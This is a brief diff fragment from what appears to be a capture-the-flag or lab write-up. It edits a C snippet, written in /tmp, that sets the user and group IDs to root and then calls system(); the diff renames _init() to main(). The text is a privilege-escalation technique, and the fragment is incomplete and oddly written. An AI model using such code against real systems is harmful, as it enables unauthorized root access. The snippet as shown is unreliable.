@@ -253,7 +253,7 @@ Go there (for example, /tmp) and create this:
 ```
 #include <unistd.h>
 
-void _init() {
+void main() {
     setgid(0);
     setuid(0);
     system("thm");
